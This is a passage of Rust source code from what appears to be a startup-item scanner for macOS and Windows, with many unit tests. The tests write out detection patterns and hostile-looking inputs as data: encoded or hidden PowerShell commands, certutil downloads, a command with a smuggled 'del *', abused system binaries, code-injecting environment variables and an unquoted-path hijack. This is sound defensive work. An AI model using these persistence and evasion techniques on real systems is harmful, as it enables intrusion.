            Some(home) => scan_dir(found, &home.join("Library/LaunchAgents"), "launch_agent"),
            None => found.unreadable(
                "Your LaunchAgents folder",
                "Your home folder could not be found.",
            ),
        }
        scan_cron(found);
        found.unreadable(
            "Login Items and background items",
            "macOS keeps this list in a protected database that apps cannot read. To see it, open System Settings > General > Login Items.",
        );
        for place in [
            "The system's own scheduled jobs (/etc/crontab) and other people's",
            "Other people's LaunchAgents folders",
            "Login and logout hooks",
            "Periodic scripts (/etc/periodic) and at jobs",
        ] {
            found.unreadable(place, "This version does not check them yet.");
        }
        found.unreadable(
            "macOS's own services (/System/Library)",
            "They are part of the sealed system and are left out.",
        );
    }
}

// ---- Windows: Run keys and Startup folders ----

#[cfg(windows)]
use self::registry::collect;

#[cfg(windows)]
mod registry {
    use super::*;
    use std::collections::HashMap;

    const RUN: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
    const RUN_ONCE: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";
    const RUN_32: &str = r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run";
    const RUN_ONCE_32: &str = r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce";

    const APPROVED: &str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved";

    /// The items Task Manager knows as on or off, by name.
    fn approvals(machine: bool, list: &str) -> HashMap<String, bool> {
        platform::read_registry_values(machine, &format!(r"{APPROVED}\{list}"))
            .map(|key| {
                key.values
                    .into_iter()
                    .filter_map(|v| Some((v.name.to_lowercase(), startup_approved(&v.data?))))
                    .collect()
            })
            .unwrap_or_default()
    }

    fn scan_key(
        found: &mut Found,
        machine: bool,
        subkey: &str,
        kind: &'static str,
        approved: Option<&str>,
    ) {
        let hive = if machine { "HKLM" } else { "HKCU" };
        let location = format!(r"{hive}\{subkey}");
        let key = match platform::read_registry_values(machine, subkey) {
            Ok(key) => key,
            Err(why) => return found.unreadable(location, why),
        };
        found.truncated |= key.incomplete;
        let switches = approved
            .map(|list| approvals(machine, list))
            .unwrap_or_default();
        for value in key.values {
            let mut c = match &value.data {
                Some(data) if value.is_text() => run_value(
                    &platform::registry_text(data),
                    value.expand(),
                    &|var| std::env::var(var).ok(),
                    &|p| Path::new(p).is_file(),
                ),
                Some(_) => continue, // Windows starts only text values
                None => Candidate {
                    notes: vec!["Its value is far larger than any real command, so it was not read and what it starts is not known.".into()],
                    ..Candidate::default()
                },
            };
            c.enabled = Some(*switches.get(&value.name.to_lowercase()).unwrap_or(&true));
            c.name = value.name;
            c.kind = kind;
            c.location = location.clone();
            c.runs_as = if machine { "every user" } else { "you" }.into();
            found.push(c);
        }
    }

    fn scan_startup_folder(found: &mut Found, dir: &Path, runs_as: &str) {
        let switches = approvals(runs_as != "you", "StartupFolder");
        let entries = match fs::read_dir(dir) {
            Ok(entries) => entries,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return,
            Err(_) => {
                found.unreadable(
                    dir.display().to_string(),
                    "This folder could not be opened. You may not have permission.",
                );
                return;
            }
        };
        let mut files: Vec<PathBuf> = Vec::new();
        for entry in entries {
            match entry {
                Ok(entry) if files.len() < MAX_DIR_ENTRIES && !found.late() => {
                    files.push(entry.path())
                }
                _ => {
                    found.truncated = true;
                    break;
                }
            }
        }
        files.sort();
        for path in files {
            let Some(file_name) = path.file_name().map(|n| n.to_string_lossy().to_string()) else {
                continue;
            };
            if file_name.eq_ignore_ascii_case("desktop.ini") {
                continue;
            }
            let mut c = Candidate {
                name: path
                    .file_stem()
                    .map(|s| s.to_string_lossy().to_string())
                    .unwrap_or_default(),
                kind: "startup_folder",
                location: path.display().to_string(),
                enabled: Some(*switches.get(&file_name.to_lowercase()).unwrap_or(&true)),
                runs_as: runs_as.into(),
                ..Candidate::default()
            };
            if path
                .extension()
                .is_some_and(|e| e.eq_ignore_ascii_case("lnk") || e.eq_ignore_ascii_case("url"))
            {
                c.doubts.push("This is a shortcut. The Nex does not read where a shortcut leads yet, so the program it starts was not checked.".into());
            } else if fs::symlink_metadata(&path).is_ok_and(|m| m.is_dir()) {
                continue; // Windows opens a folder window, it runs nothing in it
            } else {
                c.program = Some(path.display().to_string());
            }
            found.push(c);
        }
    }

    pub(super) fn collect(found: &mut Found, startup_dir: Option<&Path>) {
        if let Some(dir) = startup_dir {
            return scan_startup_folder(found, dir, "you");
        }
        for (machine, subkey, kind, approved) in [
            (false, RUN, "run_key", Some("Run")),
            (false, RUN_ONCE, "run_once_key", None),
            (true, RUN, "run_key", Some("Run")),
            (true, RUN_ONCE, "run_once_key", None),
            (true, RUN_32, "run_key", Some("Run32")),
            (true, RUN_ONCE_32, "run_once_key", None),
        ] {
            scan_key(found, machine, subkey, kind, approved);
        }
        for (var, rest, runs_as) in [
            (
                "APPDATA",
                r"Microsoft\Windows\Start Menu\Programs\Startup",
                "you",
            ),
            (
                "ProgramData",
                r"Microsoft\Windows\Start Menu\Programs\Startup",
                "every user",
            ),
        ] {
            if let Some(base) = std::env::var_os(var) {
                scan_startup_folder(found, &Path::new(&base).join(rest), runs_as);
            }
        }
        for place in [
            "Services that start automatically",
            "Scheduled tasks",
            r"Programs set by policy (Policies\Explorer\Run)",
            "Sign-in programs (Winlogon Shell and Userinit)",
            "Active Setup",
            "Other people's Run keys and Startup folders",
        ] {
            found.unreadable(place, "This version does not check them yet.");
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn args(list: &[&str]) -> Vec<String> {
        list.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn windows_command_lines_are_split_safely() {
        let files = ["C:\\Program Files\\A B\\a.exe", "C:\\Tools\\t.exe"];
        let exists = |p: &str| files.contains(&p);
        let quoted =
            parse_command_line("\"C:\\Program Files\\A B\\a.exe\" /silent \"x y\"", &exists);
        assert_eq!(quoted.program, "C:\\Program Files\\A B\\a.exe");
        assert_eq!(quoted.arguments, args(&["/silent", "x y"]));
        assert!(!quoted.unquoted_spaces);
        let unquoted = parse_command_line("C:\\Program Files\\A B\\a.exe -x", &exists);
        assert_eq!(unquoted.program, "C:\\Program Files\\A B\\a.exe");
        assert_eq!(unquoted.arguments, args(&["-x"]));
        assert!(unquoted.unquoted_spaces);
        let plain = parse_command_line("C:\\Tools\\t.exe --a --b", &exists);
        assert_eq!(
            (plain.program.as_str(), plain.unquoted_spaces),
            ("C:\\Tools\\t.exe", false)
        );
        // Nothing exists: the first word is the program, never a shell string.
        let gone = parse_command_line("C:\\Nope\\n.exe a;b & del *", &|_| false);
        assert_eq!(gone.program, "C:\\Nope\\n.exe");
        assert_eq!(gone.arguments, args(&["a;b", "&", "del", "*"]));
        // No closing quote, empty, and only spaces.
        assert_eq!(
            parse_command_line("\"C:\\a b\\c.exe", &|_| false).program,
            "C:\\a b\\c.exe"
        );
        assert_eq!(parse_command_line("   ", &|_| false).program, "");
        assert_eq!(
            split_arguments(r#"a "b \"c\" d" e"#),
            args(&["a", "b \"c\" d", "e"])
        );
    }

    #[test]
    fn environment_variables_expand_only_when_known() {
        let lookup = |name: &str| (name == "APPDATA").then(|| "C:\\U\\AppData".to_string());
        assert_eq!(
            expand_env("%APPDATA%\\x.exe", &lookup),
            "C:\\U\\AppData\\x.exe"
        );
        assert_eq!(
            expand_env("%NOPE%\\x.exe 100%", &lookup),
            "%NOPE%\\x.exe 100%"
        );
        assert_eq!(expand_env("%%", &lookup), "%%");
    }

    #[test]
    fn risky_places_and_borrowed_names_are_spotted() {
        for (path, want) in [
            ("/tmp/a", Some("temp")),
            ("/private/var/folders/x/T/a", Some("temp")),
            ("C:\\Users\\me\\AppData\\Local\\Temp\\a.exe", Some("temp")),
            ("/Users/me/Downloads/a", Some("downloads")),
            ("/Users/me/.cache/a", Some("hidden")),
            ("/usr/local/bin/.agent", Some("hidden")),
            ("./x", None),
            ("/Applications/Foo.app/Contents/MacOS/foo", None),
            ("C:\\Program Files\\Foo\\foo.exe", None),
            ("/bin/ls", None),
        ] {
            assert_eq!(risky_location(path), want, "{path}");
        }
        assert_eq!(claimed_vendor("com.apple.fake"), Some("Apple"));
        assert_eq!(claimed_vendor("MicrosoftEdgeUpdate"), Some("Microsoft"));
        assert_eq!(claimed_vendor("com.example.apple"), None);
    }

    #[test]
    fn only_understood_interpreter_shapes_name_a_script() {
        for name in [
            "python3.12",
            "bash-5.2",
            "perl5.34",
            "osascript",
            "tclsh8.5",
        ] {
            assert!(is_interpreter(name), "{name}");
        }
        assert!(is_interpreter(&program_stem("C:\\x\\PowerShell.EXE")) && !is_interpreter("ls"));
        for (stem, given, want) in [
            ("sh", &["-x", "/opt/run.sh", "a"][..], Some("/opt/run.sh")),
            ("bash", &["-eu", "-o", "pipefail", "/opt/a"], Some("/opt/a")),
            ("bash", &["-o", "/opt/a", "/opt/b"], None),
            ("bash", &["-c", "/opt/a"], None),
            ("sh", &["-ec", "/opt/a"], None),
            ("sh", &["--rcfile", "/opt/a", "/opt/b"], None),
            ("sh", &["run.sh"], None),
            ("sh", &["./run.sh"], None),
            ("sh", &[], None),
            ("zsh", &["/opt/a"], None),
            ("zsh", &["-f", "/opt/a"], Some("/opt/a")),
            ("python3.12", &["-u", "/opt/a.py"], Some("/opt/a.py")),
            ("python3", &["-m", "/opt/a"], None),
            ("python3", &["-c", "x"], None),
            ("perl", &["-e", "/opt/a"], None),
            ("perl", &["-Mx", "/opt/a"], None),
            ("ruby", &["-r", "/opt/a", "/opt/b"], None),
            (
                "osascript",
                &["-l", "JavaScript", "/opt/a.js"],
                Some("/opt/a.js"),
            ),
            ("osascript", &["-e", "/opt/a"], None),
            ("env", &["sh", "/opt/a"], None),
            (
                "powershell",
                &[
                    "-NoProfile",
                    "-ExecutionPolicy",
                    "Bypass",
                    "-File",
                    r"C:\a.ps1",
                ],
                Some(r"C:\a.ps1"),
            ),
            (
                "powershell",
                &["-ExecutionPolicy", "Bypass", "-File", r"C:\a.ps1"],
                None,
            ),
            ("powershell", &["-NoProfile", r"C:\a.ps1"], None),
            (
                "powershell",
                &["-NoProfile", "-File", r"\\host\a.ps1"],
                None,
            ),
            ("powershell", &["-enc", "AAAA"], None),
            ("wscript", &["//nologo", r"C:\a.vbs"], Some(r"C:\a.vbs")),
            ("wscript", &["//E:jscript", r"C:\a.txt"], None),
            ("cmd", &["/c", r"C:\a.bat"], None),
        ] {
            assert_eq!(script_of(stem, &args(given)), want, "{stem} {given:?}");
        }
    }

    #[test]
    fn crontab_lines_become_jobs_and_settings() {
        let text = "# comment\nMAILTO=me\nSHELL = /tmp/x a b c d e\n\n*/5 * * * * /opt/a.sh  --x\n@reboot /opt/b\n1 2 3 4\n0 1 * * * A=1 /opt/c\n";
        let tab = parse_crontab(text);
        let pairs = |list: &[(&str, &str)]| -> Vec<(String, String)> {
            list.iter()
                .map(|(a, b)| (a.to_string(), b.to_string()))
                .collect()
        };
        assert_eq!(
            tab.settings,
            pairs(&[("MAILTO", "me"), ("SHELL", "/tmp/x a b c d e")])
        );
        assert_eq!(
            tab.jobs,
            pairs(&[
                ("*/5 * * * *", "/opt/a.sh  --x"),
                ("@reboot", "/opt/b"),
                ("0 1 * * *", "A=1 /opt/c")
            ])
        );
        assert!(is_plain_command("/opt/a.sh --x=1 b"));
        for shell in [
            "/opt/a; /opt/b",
            "/opt/a | sh",
            "/opt/a $X",
            "/opt/a `b`",
            "/opt/*",
            "A=1 /opt/a",
            "/opt/a=1 b",
            "opt/a",
            "~/a",
            "/opt/a 'b'",
            "/opt/a > /b",
            "/opt/a%b",
            "(/opt/a)",
        ] {
            assert!(!is_plain_command(shell), "{shell}");
        }
    }

    #[test]
    fn plist_xml_is_read_whatever_else_is_in_it() {
        let deep = format!("{}{}", "<array>".repeat(300), "</array>".repeat(300));
        let xml = format!(
            "<?xml version=\"1.0\"?>\n<!DOCTYPE plist PUBLIC \"-//A//B\" \"http://x\">\n<plist version=\"1.0\">\n<dict>\n<key>Label</key>\n<string>a &amp;lt; &lt;b&gt;</string><key>d</key><date>2020-01-01T00:00:00Z</date><key>b</key><data>\nAAAA\n</data><key>n</key><real>nan</real><key>x</key>{deep}<key>in</key><dict><key>Program</key><string>/no</string><key>Y</key><dict><key>Z</key><true/></dict></dict><key>Program</key><string>/opt/a\nb</string><key>ProgramArguments</key><array><string/><string>x</string><integer>1</integer><dict><key>q</key><string>s</string></dict><array/></array><key>E</key><dict/><key>On</key><true/><key>Off</key><false/></dict>\n</plist>\n"
        );
        let settings = read_plist_xml(&xml).unwrap();
        let get = |key: &str| {
            settings
                .iter()
                .find(|(k, _)| k == key)
                .map(|(_, v)| v.clone())
        };
        assert_eq!(get("Label"), Some(Setting::Text("a &lt; <b>".into())));
        assert_eq!(get("Program"), Some(Setting::Text("/opt/a\nb".into())));
        assert_eq!(
            get("ProgramArguments"),
            Some(Setting::List(vec![
                Some(String::new()),
                Some("x".into()),
                None,
                None,
                None
            ]))
        );
        assert_eq!(
            get("in"),
            Some(Setting::Keys(vec!["Program".into(), "Y".into()]))
        );
        assert_eq!(get("n"), Some(Setting::Other));
        assert_eq!(get("E"), Some(Setting::Keys(vec![])));
        assert_eq!(
            (get("On"), get("Off")),
            (Some(Setting::Flag(true)), Some(Setting::Flag(false)))
        );
        assert_eq!(
            read_plist_xml("<plist version=\"1.0\"><dict/></plist>"),
            Some(vec![])
        );
        for bad in [
            "",
            "<plist><array></array></plist>",
            "<plist><dict><key>a</key>",
            "<string>x</string>",
            "</dict>",
        ] {
            assert_eq!(read_plist_xml(bad), None, "{bad}");
        }
    }

    #[test]
    fn variables_that_load_other_code_are_known() {
        for name in [
            "BASH_ENV",
            "ENV",
            "DYLD_INSERT_LIBRARIES",
            "PYTHONSTARTUP",
            "PERL5LIB",
            "PERL5OPT",
            "RUBYOPT",
            "NODE_OPTIONS",
            "ZDOTDIR",
            "BASH_FUNC_ls%%",
            "PYTHONPATH",
            "PYTHONWARNINGS",
            "DEVELOPER_DIR",
            "__XPC_DYLD_INSERT_LIBRARIES",
            "DOTNET_STARTUP_HOOKS",
            "OPENSSL_CONF",
            "LESSOPEN",
            "HOME",
            "CFFIXED_USER_HOME",
        ] {
            assert!(loads_other_code(name) && !harmless_variable(name), "{name}");
        }
        for name in [
            "PATH",
            "LANG",
            "LC_ALL",
            "TZ",
            "TMPDIR",
            "USER",
            "LOGNAME",
            "PYTHONUNBUFFERED",
            "PYTHONDONTWRITEBYTECODE",
        ] {
            assert!(harmless_variable(name) && !loads_other_code(name), "{name}");
        }
        for name in ["ENVIRONMENT", "PYTHONHASHSEED", "FOO", "path", "", "LANGX"] {
            assert!(
                !harmless_variable(name) && !loads_other_code(name),
                "{name}"
            );
        }
    }

    #[test]
    fn only_plainly_harmless_arguments_count_as_understood() {
        let is_file = |name: &str| name == "there";
        for arg in [
            "-x",
            "--quiet",
            "-l5",
            "--no-sandbox",
            "--level=3",
            "--a=b.c",
            "--a=",
        ] {
            assert!(harmless_argument(arg, &is_file), "{arg}");
        }
        for arg in [
            "x",
            "",
            "-",
            "--",
            "---x",
            "--x_y",
            "/silent",
            "--a=/opt/b",
            "--a=b:c",
            "--a=b;c",
            r"--a=b\c",
            "--a=there",
            "-a=b",
            "--=b",
            "a=b",
            "--a b",
            "--é",
        ] {
            assert!(!harmless_argument(arg, &is_file), "{arg}");
        }
        assert!(paths_in("--load=/a,/b:/c", false).contains(&"/c"));
        assert!(paths_in("--x=a.js", false).contains(&"a.js"));
        assert!(paths_in(r"--x=C:\a.dll,Entry", true).contains(&r"C:\a.dll"));
        for arg in [
            r"\\host\a.js",
            r"--x=\\host\a",
            "--x=//host/a",
            r"a;\\host\b",
        ] {
            assert!(
                paths_in(arg, true)
                    .iter()
                    .all(|p| !p.starts_with(['/', '\\'])),
                "{arg}"
            );
        }
    }

    #[test]
    fn windows_runs_only_programs_by_itself() {
        for path in [r"C:\a.exe", r"C:\a.EXE", r"C:\a.com", r"C:\a.scr"] {
            assert!(runs_by_itself(path, true), "{path}");
        }
        for path in [
            r"C:\a.txt",
            r"C:\a.js",
            r"C:\a.lnk",
            r"C:\a",
            r"C:\a.exe.hta",
            r"C:\a.exe.",
        ] {
            assert!(!runs_by_itself(path, true), "{path}");
        }
        assert!(runs_by_itself("/opt/a", false));
    }

    #[test]
    fn only_xml_in_plain_utf8_is_relied_on() {
        for text in [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><plist/>",
            "<?xml version='1.0' encoding = 'utf-8' ?>\n<plist/>",
            "\u{feff}<?xml version=\"1.0\"?><plist/>",
            "<plist/>",
        ] {
            assert_eq!(definition_doubt(text.as_bytes()), None, "{text}");
        }
        let utf16: Vec<u8> = "\u{feff}<plist/>"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect();
        for bytes in [
            &b"bplist00x"[..],
            b"<?xml version=\"1.0\" encoding=\"UTF-16\"?><plist/>",
            b"<?xml version=\"1.0\" encoding='macintosh'?><plist/>",
            b"<?xml version=\"1.0\" encoding=\"utf-8x\"?><plist/>",
            b"<?xml version=\"1.0\" encoding=?><plist/>",
            b"<?XML ENCODING=\"UTF-7\"?><plist/>",
            b"<plist>\xff</plist>",
            b"<plist>\0</plist>",
            b"{ Label = a; }",
            b"",
            &utf16,
            &utf16[2..],
        ] {
            assert!(definition_doubt(bytes).is_some(), "{bytes:?}");
        }
    }

    #[test]
    fn a_vendor_name_is_proof_only_as_an_exact_label() {
        for name in ["com.apple.x", "com.microsoft.x", " COM.Apple.y"] {
            assert!(exact_vendor_label(name), "{name}");
        }
        for name in [
            "Microsoft Teams Helper",
            "Apple Music sync",
            "org.com.apple.x",
            "com.applex",
        ] {
            assert!(!exact_vendor_label(name), "{name}");
        }
    }

    fn found(max_items: usize, deadline: Instant) -> Found {
        Found {
            candidates: Vec::new(),
            unreadable: Vec::new(),
            truncated: false,
            max_items,
            deadline,
            skipped: Arc::new(LiveSkipped::new(PathBuf::new())),
        }
    }

    #[test]
    fn when_there_are_too_many_the_most_worrying_are_kept() {
        let named = |name: &str, args: &[&str], note: &str| Candidate {
            name: name.into(),
            program: Some("powershell".into()),
            arguments: self::args(args),
            notes: (!note.is_empty())
                .then(|| note.into())
                .into_iter()
                .collect(),
            ..Candidate::default()
        };
        let mut found = found(2, Instant::now());
        found.push(named("plain", &[], ""));
        found.push(named("plain2", &[], ""));
        assert!(!found.truncated, "two fit");
        found.push(named("plain3", &[], ""));
        assert!(found.truncated, "one was left out");
        let names = |f: &Found| -> Vec<String> {
            f.candidates.iter().map(|(_, c)| c.name.clone()).collect()
        };
        assert_eq!(names(&found), ["plain", "plain2"]);
        found.push(named("odd", &[], "others can change it"));
        found.push(named("bad", &["-enc", "AAAA"], ""));
        found.push(named("odd2", &[], "others can change it"));
        assert_eq!(names(&found), ["odd", "bad"]);
        found.push(named("bad2", &["-enc", "AAAA"], ""));
        found.push(named("bad3", &["-enc", "AAAA"], ""));
        assert_eq!(names(&found), ["bad", "bad2"]);
    }

    #[test]
    fn what_a_command_says_counts_even_without_time_to_judge_it() {
        let cfg = Arc::new(AppConfig::for_base_dir(Path::new("/nonexistent/thenex")));
        let scanner = Arc::new(BinaryAiScanner::heuristic_only());
        let timed = |args: &[&str]| {
            let c = Candidate {
                program: Some("powershell".into()),
                arguments: self::args(args),
                ..Candidate::default()
            };
            judge_timed(&cfg, &scanner, &c, Duration::ZERO)
        };
        let plain = timed(&[]);
        assert_eq!(plain.verdict, Verdict::NotChecked);
        assert!(plain.reasons[0].contains("took too long"));
        let bad = timed(&["-enc", "AAAA"]);
        assert_eq!(bad.verdict, Verdict::Suspicious);
        assert!(bad.reasons.iter().any(|r| r.contains("took too long")));
    }

    #[test]
    fn windows_paths_that_would_contact_another_computer_are_never_looked_up() {
        for path in [
            r"\\host\share\a.exe",
            "//host/share/a.exe",
            r"\\?\C:\a.exe",
            r"\\.\pipe\a",
            r"\??\C:\a.exe",
            r"\a.exe",
            "a.exe",
            "powershell",
            r"C:a.exe",
            "",
            "C:",
        ] {
            assert!(!full_path(path, true), "{path}");
            assert_eq!(
                parse_command_line(&format!("{path} -x"), &|p| panic!("looked up {p}")).arguments,
                if path.is_empty() {
                    args(&[])
                } else {
                    args(&["-x"])
                },
                "{path}"
            );
        }
        assert!(full_path(r"C:\a.exe", true) && full_path("d:/a", true));
        assert!(full_path("/a", false) && !full_path("./a", false) && !full_path("a", false));
        assert_eq!(path_in("--file=/opt/a", false), Some("/opt/a"));
        assert_eq!(path_in(r"C:\a.dll,Entry", true), Some(r"C:\a.dll"));
        assert_eq!(path_in(r"/i:D:\x.dll", true), Some(r"D:\x.dll"));
        assert_eq!(path_in(r"\\host\a.dll", true), None);
    }

    #[test]
    fn windows_adds_exe_to_a_path_without_an_extension() {
        let on = |files: &'static [&'static str]| move |p: &str| files.contains(&p);
        let hijack = parse_command_line(
            r"C:\Program Files\A\a.exe -x",
            &on(&[r"C:\Program.exe", r"C:\Program Files\A\a.exe"]),
        );
        assert_eq!(
            (hijack.program.as_str(), hijack.unquoted_spaces),
            (r"C:\Program.exe", true)
        );
        let plain = parse_command_line(r"C:\T\a -x", &on(&[r"C:\T\a.exe"]));
        assert_eq!(
            (plain.program.as_str(), plain.arguments),
            (r"C:\T\a.exe", args(&["-x"]))
        );
        assert_eq!(
            parse_command_line("\"C:\\T\\a\" -x", &on(&[r"C:\T\a.exe"])).program,
            r"C:\T\a.exe"
        );
        // Every argument is kept, however many there are.
        let many = format!("\"C:\\T\\a.exe\" {}", "x ".repeat(500));
        assert_eq!(parse_command_line(&many, &|_| true).arguments.len(), 500);
    }

    #[test]
    fn run_values_expand_only_when_windows_would() {
        let lookup = |name: &str| (name == "TEMP").then(|| r"C:\T".to_string());
        let program = |expand| {
            run_value(r"%TEMP%\a.exe -x", expand, &lookup, &|_| true)
                .program
                .unwrap()
        };
        assert_eq!(program(true), r"C:\T\a.exe");
        assert_eq!(program(false), r"%TEMP%\a.exe");
        assert!(startup_approved(&[2, 0, 0]) && startup_approved(&[6]) && startup_approved(&[]));
        assert!(!startup_approved(&[3, 0, 0]) && !startup_approved(&[7]));
    }

    #[test]
    fn a_borrowed_vendor_name_is_judged_by_what_can_be_told() {
        use Claim::{Confirmed, Contradicted, Unknown};
        // (vendor, part of the system, signed by the vendor, trusted)
        for (vendor, os_file, signed, trusted, want) in [
            ("Apple", true, Some(true), true, Confirmed),
            ("Apple", false, Some(true), true, Confirmed),
            ("Apple", false, Some(false), true, Contradicted),
            ("Microsoft", false, Some(true), true, Confirmed),
            ("Microsoft", false, Some(false), true, Contradicted),
            ("Microsoft", true, Some(false), true, Contradicted),
            // Windows: whose signature it is cannot be told.
            ("Microsoft", true, None, true, Confirmed),
            ("Microsoft", false, None, true, Unknown),
            ("Apple", false, None, true, Unknown),
            ("Apple", true, None, true, Unknown),
            ("Microsoft", false, None, false, Contradicted),
            ("Apple", false, None, false, Contradicted),
        ] {
            assert_eq!(
                check_claim(vendor, os_file, signed, trusted),
                want,
                "{vendor} {os_file} {signed:?} {trusted}"
            );
        }
    }

    #[test]
    fn commands_that_hide_things_are_found_by_windows_names_too() {
        let check = |program: &str, given: &[&str]| {
            let cfg = AppConfig::for_base_dir(Path::new("/nonexistent/thenex"));
            judge(
                &cfg,
                &BinaryAiScanner::heuristic_only(),
                Candidate {
                    program: Some(program.into()),
                    arguments: args(given),
                    ..Candidate::default()
                },
            )
        };
        for (program, given) in [
            ("powershell", &["-enc", "AAAA"][..]),
            (r"\\host\powershell.exe", &["-enc", "AAAA"]),
            ("PowerShell.EXE", &["-w", "hidden", "-c", "x"]),
            ("certutil", &["-urlcache", "x"]),
        ] {
            let item = check(program, given);
            assert_eq!(
                item.verdict,
                Verdict::Suspicious,
                "{program}: {:?}",
                item.reasons
            );
        }
        // Not found, but what it would run is said all the same.
        for program in [
            "rundll32.exe",
            "regsvr32",
            "msbuild",
            "mshta.exe",
            "wscript",
            "cmd",
            "rundll32",
        ] {
            let item = check(program, &["x"]);
            assert_eq!(
                (item.verdict, item.exists),
                (Verdict::WorthALook, None),
                "{program}"
            );
        }
        let bare = check("updater", &["--quiet"]);
        assert_eq!((bare.verdict, bare.exists), (Verdict::NotChecked, None));
    }

    #[test]
    fn the_largest_possible_report_still_reaches_the_app() {
        let long = "\"".repeat(5000);
        let item = StartupItem {
            name: long.clone(),
            kind: long.clone(),
            location: long.clone(),
            program: Some(long.clone()),
            arguments: vec![long.clone(); 100],
            script: Some(long.clone()),
            enabled: Some(false),
            exists: Some(false),
            trusted: false,
            verdict: Verdict::WorthALook,
            score: Some(0.123_456_79),
            reasons: vec![long.clone(); 30],
            allowed: false,
            runs_as: long.clone(),
        };
        let place = Unreadable {
            place: long.clone(),
            reason: long,
        };
        let mut report = StartupReport {
            items: vec![item; MAX_ITEMS + 1],
            unreadable: vec![place; MAX_UNREADABLE + 1],
            truncated: false,
        };
        report.clamp();
        assert!(report.truncated);
        assert_eq!(report.items[0].arguments.last().unwrap(), "… and 85 more");
        let once = report.clone();
        report.clamp();
        assert_eq!(report, once, "the app clamps again and must not change it");
        let bytes = serde_json::to_vec(&report).unwrap().len() as u64;
        assert!(bytes < MAX_REPORT_BYTES, "{bytes}");
        // Other places that could not be read are counted, not dropped in silence.
        let mut few = StartupReport {
            unreadable: vec![report.unreadable[0].clone(); MAX_UNREADABLE + 1],
            ..StartupReport::default()
        };
        few.clamp();
        assert!(few.truncated);
    }

    #[test]
    fn a_report_is_cut_to_its_limits_and_has_a_stable_shape() {
        let item = StartupItem {
            name: "x\ny".repeat(500),
            kind: "cron".into(),
            location: "l".into(),
            program: Some("/p".into()),
            arguments: vec!["a".repeat(1000); 40],
            script: None,
            enabled: Some(true),
            exists: Some(true),
            trusted: false,
            verdict: Verdict::WorthALook,
            score: None,
            reasons: vec!["r".into(); 30],
            allowed: false,
            runs_as: "you".into(),
        };
        let mut report = StartupReport {
            items: vec![item; MAX_ITEMS + 5],
            ..StartupReport::default()
        };
        report.clamp();
        assert!(report.truncated && report.items.len() == MAX_ITEMS);
        let first = &report.items[0];
        assert!(first.name.chars().count() <= MAX_TEXT && !first.name.contains('\n'));
        assert_eq!(
            (first.arguments.len(), first.reasons.len()),
            (MAX_ARGS, MAX_REASONS)
        );
        assert!(first.arguments[0].chars().count() <= MAX_TEXT);
        let json = serde_json::to_value(first).unwrap();
        let mut keys: Vec<&str> = json
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        keys.sort();
        assert_eq!(
            keys,
            [
                "allowed",
                "arguments",
                "enabled",
                "exists",
                "kind",
                "location",
                "name",
                "program",
                "reasons",
                "runs_as",
                "score",
                "script",
                "trusted",
                "verdict"
            ]
        );
        assert_eq!(json["verdict"], "worth_a_look");
        let top: Vec<String> = serde_json::to_value(&report)
            .unwrap()
            .as_object()
            .unwrap()
            .keys()
            .cloned()
            .collect();
        assert_eq!(top.len(), 3);
    }

    #[test]
    fn only_the_real_own_service_is_recognised() {
        let engine = Path::new("/Library/Application Support/TheNex/engine/the-nex");
        let program = engine.to_str().unwrap();
        let none: Vec<String> = Vec::new();
        let notifier = vec!["--notifier".to_string()];
        let check = |name, kind, program, args: &[String], file, folder| {
            is_own_service(name, kind, program, args, engine, file, folder)
        };
        assert!(check(
            "com.thenex.edr",
            "launch_daemon",
            program,
            &none,
            true,
            true
        ));
        assert!(check(
            "com.thenex.edr.notifier",
            "launch_agent",
            program,
            &notifier,
            true,
            true
        ));
        // Each condition on its own is needed.
        assert!(
            !check(
                "com.thenex.edr",
                "launch_daemon",
                program,
                &none,
                false,
                true
            ),
            "file"
        );
        assert!(
            !check(
                "com.thenex.edr",
                "launch_daemon",
                program,
                &none,
                true,
                false
            ),
            "folder"
        );
        assert!(!check(
            "com.thenex.edr",
            "launch_daemon",
            "/tmp/the-nex",
            &none,
            true,
            true
        ));
        assert!(!check(
            "com.thenex.edr",
            "launch_daemon",
            "/Library/Application Support/TheNex/Engine/the-nex",
            &none,
            true,
            true
        ));
        assert!(!check(
            "com.thenex.edr",
            "launch_daemon",
            "/Library/Application Support/TheNex/engine/../engine/x/the-nex",
            &none,
            true,
            true
        ));
        assert!(!check(
            "com.thenex.edr.",
            "launch_daemon",
            program,
            &none,
            true,
            true
        ));
        assert!(
            !check("com.thenex.edr", "launch_agent", program, &none, true, true),
            "wrong kind"
        );
        assert!(!check(
            "com.thenex.edr",
            "run_key",
            program,
            &none,
            true,
            true
        ));
        assert!(
            !check(
                "com.thenex.edr",
                "launch_daemon",
                program,
                &notifier,
                true,
                true
            ),
            "extra arguments"
        );
        assert!(!check(
            "com.thenex.edr.notifier",
            "launch_agent",
            program,
            &none,
            true,
            true
        ));
    }

    #[cfg(unix)]
    #[test]
    fn a_file_the_user_owns_or_a_link_is_never_root_owned_and_closed() {
        let dir = std::env::temp_dir().join(format!("thenex-own-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        let file = dir.join("the-nex");
        fs::write(&file, b"x").unwrap();
        // Owned by whoever runs the tests; only root-run tests could ever see "true" here.
        if !fs::metadata(&file)
            .map(|m| std::os::unix::fs::MetadataExt::uid(&m) == 0)
            .unwrap_or(false)
        {
            assert!(!root_owned_closed(&file, false));
            assert!(!root_owned_closed(&dir, true));
        }
        let link = dir.join("link");
        std::os::unix::fs::symlink("/bin/sh", &link).unwrap();
        assert!(!root_owned_closed(&link, false), "a link is not the file");
        assert!(!root_owned_closed(&dir.join("missing"), false));
        #[cfg(target_os = "macos")]
        {
            assert!(root_owned_closed(Path::new("/bin/ls"), false));
            assert!(root_owned_closed(Path::new("/bin"), true));
            assert!(
                !root_owned_closed(Path::new("/bin/ls"), true),
                "a file is not a folder"
            );
            assert!(
                !root_owned_closed(Path::new("/tmp"), true),
